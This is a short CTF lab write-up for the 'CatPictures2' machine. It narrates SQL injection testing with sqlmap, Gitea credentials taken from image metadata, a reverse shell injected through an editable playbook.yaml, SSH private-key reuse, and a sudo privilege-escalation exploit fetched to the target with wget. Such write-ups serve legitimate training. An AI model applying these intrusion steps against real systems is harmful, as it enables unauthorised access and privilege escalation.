# CTF Writeup: CatPictures2

---

- Step 1: made basic enumeration and found out that --> 22,80,1337 & 3000 are open -->
- Step 2: specifically analyzed port 1337 & 3000 with gobuster,ffuf & dirsearch. Gathered specific endpoints,
which ultimately lead me to nothing
- Step 3: when I press on the login form, the username is prompted with "1* UNION SELECT null-- -" --> mysqlLite?
- Step 4: Intercepted traffic with proxy and forwarded package to repeater, copied packet and into .txt file &
ran sqlmap on it. --> made sqlmap -r req.txt --dump --> 
- Step 5: After being stuck for a while I had to research and found out that on the webpage, the pictures 
have metadata stored in them which reveals a hidden path
- Step 6: Went into hidden path of webpage and found gitea user creds. --> logged in and retrieved the first flag.
- Step 7: analyzed all pull requests, which didn't provide a lot of information, but since on port 1337 you can execute
the scripts (playbook.yaml) which we can modify, I injected an rce bash script, which at first didn't work, but after
some testings --> made bash -c "<bash_SCRIPT>" and it worked --> started listener and got rce on server.
- Step 8: in the user dir, are the private keys for bismuth user, which I stored on my local machine --> made chmod 600 id_rsa3 --> made ssh -i id_rsa3 bismuth@target_ip to sign in without pass. --> got ssh access
- Step 9: found public root key in bismuth dir and retrieved second flag. 
- Step 10: After analyzing multiple dir's I got stuck and had to research --> sudo --version apparently displays
that sudo is outdated and can be exploited.
- Step 11: Checked for cve exploit on github --> found blasty's --> installed it on local machine and grouped the files within a tar file. 
--> made tar -cvf exploit.tar CVE* --> gave file full rights --> made python -m http.server 8000 --> went into ssh again and made --> wget http:/machine_ip:8000/exploit.tar --> made tar xopf exploit.tar --> which unzipped the file --> navigated into cve folder and used "make" which creates a file to exploit sudo. made ./file and 0 to get first option and got root access
--> navigated into root dir and got last flag.

---

## Key Learnings

- Added new tool exiftool to knowledge --> which strips metadata out of pictures
- Learned about .yaml file exploits.
- Strengthened privilege escalation methodology --> by checking sudo --version which is exploitable.
- Further improved general knowledge about manual file transfer between local machine and target machine --> tar which zips files into one.
